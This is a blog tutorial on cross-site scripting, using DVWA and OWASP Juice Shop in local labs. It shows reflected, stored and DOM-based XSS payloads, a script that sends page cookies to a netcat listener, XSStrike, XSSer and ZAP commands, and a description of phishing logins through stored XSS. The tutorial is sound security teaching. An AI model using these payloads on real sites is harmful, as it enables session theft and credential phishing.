<!DOCTYPE html><html lang="en-US" mode="light" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Cross-Site Scripting (XSS)" /><meta name="author" content="Gaurav Kumar" /><meta property="og:locale" content="en_US" /><meta name="description" content="Type of injection attack where malicious scripts are injected in trusted websites, and executed by the visitor’s browser." /><meta property="og:description" content="Type of injection attack where malicious scripts are injected in trusted websites, and executed by the visitor’s browser." /><link rel="canonical" href="https://gkgaurav31.github.io/posts/cross-site-scripting-xss/" /><meta property="og:url" content="https://gkgaurav31.github.io/posts/cross-site-scripting-xss/" /><meta property="og:site_name" content="Gaurav’s GitHub Page" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-11-13T22:49:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Cross-Site Scripting (XSS)" /><meta name="twitter:site" content="@gkgaurav31" /><meta name="twitter:creator" content="@Gaurav Kumar" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Gaurav Kumar"},"dateModified":"2025-01-31T23:13:45+05:30","datePublished":"2024-11-13T22:49:00+05:30","description":"Type of injection attack where malicious scripts are injected in trusted websites, and executed by the visitor’s browser.","headline":"Cross-Site Scripting (XSS)","mainEntityOfPage":{"@type":"WebPage","@id":"https://gkgaurav31.github.io/posts/cross-site-scripting-xss/"},"url":"https://gkgaurav31.github.io/posts/cross-site-scripting-xss/"}</script><title>Cross-Site Scripting (XSS) | Gaurav's GitHub Page</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous" /><link rel="dns-prefetch" href="https://fonts.gstatic.com" /><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials" /><link rel="dns-prefetch" href="https://www.google-analytics.com" /><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous" /><link rel="dns-prefetch" href="https://www.googletagmanager.com" /><link rel="preconnect" href="https://cdn.jsdelivr.net" /><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous" /><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js" ></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-BM99475K5Q"></script> <script> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-BM99475K5Q'); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/freak.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Gaurav's GitHub Page</a></div><div class="site-subtitle font-italic">A place to code</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a><li class="nav-item"> <a href="/coffee/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>BUY ME A COFFEE</span> </a><li class="nav-item"> <a href="/gratitude/" class="nav-link"> <i class="fa-fw fas fa-heart ml-xl-3 mr-xl-3 unloaded"></i> <span>THANK YOU!</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/gkgaurav31" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/gkgaurav31" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gkgaurav31','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Cross-Site Scripting (XSS)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Cross-Site Scripting (XSS)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Gaurav Kumar </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Nov 13, 2024, 10:49 PM +0530" prep="on" > Nov 13, 2024 <i class="unloaded">2024-11-13T22:49:00+05:30</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 31, 2025, 11:13 PM +0530" prefix="Updated " > Jan 31 <i class="unloaded">2025-01-31T23:13:45+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1389 words">7 min</span></div></div><div class="post-content"><p>Type of injection attack where malicious scripts are injected in trusted websites, and executed by the visitor’s browser.</p><p>Let us see a sample to understand a XSS security issue:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Simple XSS Demo<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>Simple XSS Example<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"GET"</span> <span class="na">action=</span><span class="s">""</span><span class="nt">&gt;</span>
      <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"name"</span><span class="nt">&gt;</span>Enter your name:<span class="nt">&lt;/label&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"name"</span> <span class="na">name=</span><span class="s">"name"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/form&gt;</span>

    <span class="nt">&lt;p&gt;</span>
      Hello,
      <span class="nt">&lt;span</span> <span class="na">id=</span><span class="s">"output"</span><span class="nt">&gt;</span>
        <span class="c">&lt;!-- This is where the vulnerability lies --&gt;</span>
        <span class="cp">&lt;?php echo $_GET['name']; ?&gt;</span> <span class="nt">&lt;/span</span>
      <span class="nt">&gt;</span>!
    <span class="nt">&lt;/p&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>This code is vulnerable to Cross-Site Scripting (XSS) because it directly inserts user input into the page without checking or cleaning it. When a user submits their name via the form, the name is shown on the page using PHP like this:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span> <span class="cp">?&gt;</span>
</pre></table></code></div></div><p>If a user enters a malicious script (For example: <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert('XSS');&lt;/script&gt;</code>), it will be executed in the browser. This could allow attackers to steal cookies, redirect users, or perform other harmful actions.</p><p>A good way to practically learn about these attacks, we can make use of the following “insecure” containerized apps:</p><p><a href="https://github.com/digininja/DVWA?tab=readme-ov-file#damn-vulnerable-web-application">DAMN VULNERABLE WEB APPLICATION (DVWA)</a></p><p><code class="language-plaintext highlighter-rouge">docker run --rm -it -p 80:80 --name vulnerable vulnerables/web-dvwa</code></p><p><a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop</a></p><p><code class="language-plaintext highlighter-rouge">docker run --rm -p 3000:3000 --name juice-shop bkimminich/juice-shop</code></p><h2 id="reflected-xss">REFLECTED XSS</h2><p>This scenario is similar to the previous example, where an attacker can inject and execute JavaScript in a user’s browser, taking advantage of client-side vulnerabilities.</p><p>For example, a hacker could create a malicious shortened URL like <a href="http://somewebsite/xss_r/?name=%3Cscript%3Ealert%28%22XSS%21%21%21%22%29%3C%2Fscript%3E#">http://somewebsite/xss_r/?name=%3Cscript%3Ealert%28%22XSS%21%21%21%22%29%3C%2Fscript%3E#</a>. If a victim clicks on this link, it will execute the JavaScript on their machine. This can potentially allow the attacker to steal sensitive information, such as cookies, session data, or personal details, by exploiting the vulnerabilities in the user’s browser.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/security/xss-reflected.png" alt="snapshot" /></p><p>Here’s a way through which a hacker can potentially steal your cookies which may contain sensitive information. To demonstrate it, I will run a test server using <code class="language-plaintext highlighter-rouge">nc</code>.</p><p>Command: <code class="language-plaintext highlighter-rouge">nc -lvp 4444</code><br /> Listens on port 4444 for incoming connections in verbose mode.</p><p>Using this payload, we can send the webpage’s cookies to a server on 127.0.0.1:4444 by creating an image request with the document.cookie as a query string. The server will capture and log the cookies, which may include sensitive information like authentication tokens or session data.</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
  <span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://127.0.0.1:4444?output=</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/security/xss-reflected-cookie.png" alt="snapshot" /></p><blockquote><p><code class="language-plaintext highlighter-rouge">TIP</code>: The following site has a “cheat-sheet” for OWASP payloads and strategies that can be used to test vulnerability: <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-locator-polyglot">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-locator-polyglot</a></p></blockquote><blockquote><p><code class="language-plaintext highlighter-rouge">XSS Locator (Polyglot)</code> This test delivers a ‘polyglot test XSS payload’ that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs: javascript:/<em>–&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt; &lt;svg/onload=’+/”`/+/onmouseover=1/+/[</em>/[]/+alert(42);//’&gt;</p></blockquote><p>There are certain tools which can help in detecting such vulnerabilities, such as: <a href="https://github.com/s0md3v/XSStrike">XSStrike</a> and <a href="https://github.com/epsylon/xsser">XSSer</a>.</p><h3 id="using-xsstrike">USING XSSTRIKE</h3><ul><li>Clone the repo and run <code class="language-plaintext highlighter-rouge">python xsstrike.py</code><li>Get the PHPSESSIONID Cookie value (We can use <code class="language-plaintext highlighter-rouge">document.cookie</code> method) for the website<li>From the terminal, run the following command after updating it with your header values:</ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python xsstrike.py <span class="nt">-u</span> http://localhost/vulnerabilities/xss_r/?name<span class="o">=</span>query <span class="nt">--headers</span> <span class="s2">"Cookie: security=high; PHPSESSID=xxxxxxxxxxxxxx"</span> <span class="nt">--skip-dom</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/security/xss-reflected-xsstrike.png" alt="snapshot" /></p><h3 id="using-xsser">USING XSSER</h3><ul><li>Clone the repo<li>Install using: <code class="language-plaintext highlighter-rouge">sudo python ./setup.py install</code><li>Test</ul><p>We can use the following command for testing for XSS vulnerabilities:</p><p><code class="language-plaintext highlighter-rouge">xsser -u 'http://127.0.0.1' -g '/vulnerabilities/xss_r/?name=XSS' --cookie='security=high; PHPSESSID=tk1os5mdrfe3b3obj6jde7opu5' --ignore-proxy --threads 2 --auto</code></p><blockquote><p>The query parameter should have XSS value other you would get an error like: At least one -payloader- using a keyword: ‘XSS’ (for hex.hash) or ‘X1S’ (for int.hash):</p></blockquote><ul><li>A report will be generated in the file <code class="language-plaintext highlighter-rouge">XSSreport.raw</code></ul><p>Here’s an example of what the report would contain:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="o">===========================================================================</span>

<span class="o">[</span>+] Target: http://127.0.0.1 | /vulnerabilities/xss_r/?name<span class="o">=</span>XSS
<span class="o">[</span>+] Vector: <span class="o">[</span> name <span class="o">]</span>

<span class="o">[!]</span> Method: URL
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hash: d35938008e2c6bd97f2e3e1fd88f601f

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload:

 http://127.0.0.1/vulnerabilities/xss_r/?name<span class="o">=</span>%3Cform%3E%3Cbutton+formaction%3Djavascript%26colon%3Bd35938008e2c6bd97f2e3e1fd88f601f%3EY

<span class="o">[!]</span> Vulnerable: <span class="o">[</span>Not Info]

<span class="o">[!]</span> Status: XSS FOUND!

<span class="o">===========================================================================</span>
</pre></table></code></div></div><h2 id="stored-xss">STORED XSS</h2><p>In Stored XSS, malicious input is saved on the server and executed whenever a user visits the affected page. For example, on a site like YouTube, a hacker could post a JavaScript payload as a comment. When other users view the page, the script executes, potentially stealing credentials or performing malicious actions. Unlike Reflected XSS, where the script is part of a crafted link, Stored XSS persists on the server and impacts multiple users over time.</p><p>Here’s a GitHub page which contains certain useful XSS Payload which can be ucsed for testing: <a href="https://github.com/terjanq/Tiny-XSS-Payloads?tab=readme-ov-file#tiny-xss-payloads">Tiny-XSS-Payloads</a>.</p><p>Let’s use the same DVWA application -&gt; XSS (Stored) page to learn about this.</p><p>Using the PayLoad <code class="language-plaintext highlighter-rouge">&lt;svg onload=alert(1)&gt;</code> we can see that the site is vulnerable (when Security Level = low).</p><p>It contains a <code class="language-plaintext highlighter-rouge">Message</code> textarea which has a client side character input limit.</p><p>We will use a proxy called <code class="language-plaintext highlighter-rouge">Zed Attach Proxy</code>: <a href="https://www.zaproxy.org/">zaproxy</a>.</p><blockquote><p>ZAP is what is known as a “manipulator-in-the-middle proxy.” It stands between the tester’s browser and the web application so that it can intercept and inspect messages sent between browser and web application, modify the contents if needed, and then forward those packets on to the destination.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/security/zap.png" alt="snapshot" /></p><h3 id="bypassing-client-side-character-limits-with-zap">BYPASSING CLIENT-SIDE CHARACTER LIMITS WITH ZAP</h3><p>Using ZAP, we can bypass client-side character limits. Follow these steps:</p><ol><li><p>Open ZAP and choose <code class="language-plaintext highlighter-rouge">Manual Explore</code></p><ul><li>URL: <code class="language-plaintext highlighter-rouge">http://localhost</code><li>Click on <code class="language-plaintext highlighter-rouge">Launch Browser</code></ul><li><p>A new browser instance will launch, and requests will be proxied through ZAP.</p><ul><li>Navigate to the target site (e.g., DVWA at <code class="language-plaintext highlighter-rouge">http://localhost</code>).</ul><li><p>Enable breakpoints in ZAP</p><ul><li>Click on the green circular button in the menu bar to enable breakpoints for all requests.</ul><li><p>Intercept and modify requests</p><ul><li>Fill in the <code class="language-plaintext highlighter-rouge">Name</code> and <code class="language-plaintext highlighter-rouge">Message</code> fields on the site and send the request.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/security/zap-simple-message-1.png" alt="snapshot" /></p><p>⚠️ The intercepted request in ZAP can now be modified before being sent to the server, allowing you to bypass any client-side restrictions imposed on character input.</p><li><p>You can modify the POST body by replacing it with: <code class="language-plaintext highlighter-rouge">txtName=test&amp;mtxMessage=&lt;IMG SRC=# onmouseover="alert('xss')"&gt;&amp;btnSign=Sign+Guestbook</code> on zap. You can even go beyond the number of characters allowed to see if that goes through.</p><li><p>Click on continue to next break point. The request will go to the server, get processed and saved!</p></ol><blockquote><p>A hacker could exploit this method to add a malicious HTML form that tricks users into entering their credentials. The user might believe they need to sign in to view comments, while the JavaScript silently sends the submitted data to an attacker-controlled server, exploiting the vulnerability.</p></blockquote><h3 id="automated-xss-vulnerability-test-using-zap">AUTOMATED XSS VULNERABILITY TEST USING ZAP</h3><p>To automate XSS testing using OWASP ZAP, follow these steps:</p><ul><li>Launch the website in a browser via ZAP, so the request gets intercepted by ZAP.<li>In ZAP, review the intercepted request and response.<li>Identify the part of the request to fuzz, such as the <code class="language-plaintext highlighter-rouge">txtName</code> parameter.<li>Right-click on the <code class="language-plaintext highlighter-rouge">txtName</code> field within the request and select <code class="language-plaintext highlighter-rouge">Fuzz</code> to begin the automated injection of XSS payloads.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/security/zap-fuzz.png" alt="snapshot" /></p><ul><li>From there, click on <code class="language-plaintext highlighter-rouge">Payloads</code> -&gt; <code class="language-plaintext highlighter-rouge">Add</code> -&gt; <code class="language-plaintext highlighter-rouge">File Fuzzers</code> -&gt; <code class="language-plaintext highlighter-rouge">jbrofuzz</code> -&gt; Select `XSS.<li>Confirm the selection and “start fuzzing”.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/security/zap-fuzz-result.png" alt="snapshot" /></p><ul><li>After fuzzing is complete, check the <code class="language-plaintext highlighter-rouge">State</code> column to identify any potential vulnerabilities. The payload used for each request will be highlighted above the corresponding entry.</ul><h2 id="dom-based-xss">DOM-BASED XSS</h2><p>The attack occurs on the client side (in the browser), where JavaScript code manipulates the DOM (Document Object Model). It doesn’t rely on the server to reflect or process the input; instead, the client-side script directly handles the malicious input.</p><p>In the DVWA site, if we go to the page <code class="language-plaintext highlighter-rouge">XSS (DOM)</code> and inspect the HTML, we can see that it includes the following javascript:</p><p>This JavaScript code checks if the URL contains the query parameter default=. If it does, it extracts the value of this parameter, decodes it, and creates an <code class="language-plaintext highlighter-rouge">&lt;option&gt;</code> element with that value for a dropdown list. It then adds a separator option <code class="language-plaintext highlighter-rouge">(----)</code> and includes additional language options: English, French, Spanish, and German.</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">if </span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">default=</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">lang</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">default=</span><span class="dl">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span>
  <span class="p">);</span>
  <span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span>
    <span class="dl">"</span><span class="s2">&lt;option value='</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">lang</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">'&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nf">decodeURI</span><span class="p">(</span><span class="nx">lang</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;/option&gt;</span><span class="dl">"</span>
  <span class="p">);</span>
  <span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;option value='English'&gt;English&lt;/option&gt;</span><span class="dl">"</span><span class="p">);</span>
<span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;option value='French'&gt;French&lt;/option&gt;</span><span class="dl">"</span><span class="p">);</span>
<span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;</span><span class="dl">"</span><span class="p">);</span>
<span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;option value='German'&gt;German&lt;/option&gt;</span><span class="dl">"</span><span class="p">);</span>
</pre></table></code></div></div><p>We can easily exploit this vulnerability by modifying the default query parameter in the URL, like so:</p><p><a href="http://127.0.0.1/vulnerabilities/xss_d/?default=Test">http://127.0.0.1/vulnerabilities/xss_d/?default=Test</a></p><p>As a result, the Test language will appear in the drop-down list of available languages.</p><p>To automate DOM XSS vulnerability testing, we can use xsstrike, just like we did for reflective XSS.</p><blockquote><p><code class="language-plaintext highlighter-rouge">TIP</code>: When looking for vulnerability, look out for <code class="language-plaintext highlighter-rouge">document.write</code> method in the source code.</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/clean-code/'>clean_code</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/browser/" class="post-tag no-text-decoration" >browser</a> <a href="/tags/theory/" class="post-tag no-text-decoration" >theory</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cross-Site Scripting (XSS) - Gaurav's GitHub Page&url=https://gkgaurav31.github.io/posts/cross-site-scripting-xss/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cross-Site Scripting (XSS) - Gaurav's GitHub Page&u=https://gkgaurav31.github.io/posts/cross-site-scripting-xss/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Cross-Site Scripting (XSS) - Gaurav's GitHub Page&url=https://gkgaurav31.github.io/posts/cross-site-scripting-xss/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkgaurav31.github.io/posts/cross-site-scripting-xss/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/amount-of-time-for-binary-tree-to-be-infected/">Amount of Time for Binary Tree to Be Infected</a><li><a href="/posts/cross-site-scripting-xss/">Cross-Site Scripting (XSS)</a><li><a href="/posts/find-the-celebrity/">Find the Celebrity</a><li><a href="/posts/find-the-element-that-appears-once-in-sorted-array/">Find the element that appears once in sorted array (geeksforgeeks - SDE Sheet)</a><li><a href="/posts/find-all-pairs-with-a-given-sum-geeksforgeeks-sde-sheet/">Find all pairs with a given sum (geeksforgeeks - SDE Sheet)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/java/">java</a> <a class="post-tag" href="/tags/geeksforgeeks/">geeksforgeeks</a> <a class="post-tag" href="/tags/important/">important</a> <a class="post-tag" href="/tags/leetcode/">leetcode</a> <a class="post-tag" href="/tags/sde-sheet/">sde-sheet</a> <a class="post-tag" href="/tags/arrays/">arrays</a> <a class="post-tag" href="/tags/neetcode150/">neetcode150</a> <a class="post-tag" href="/tags/binarytree/">binarytree</a> <a class="post-tag" href="/tags/dynamic-programming/">dynamic_programming</a> <a class="post-tag" href="/tags/interviewbit/">interviewbit</a></div></div></div><script 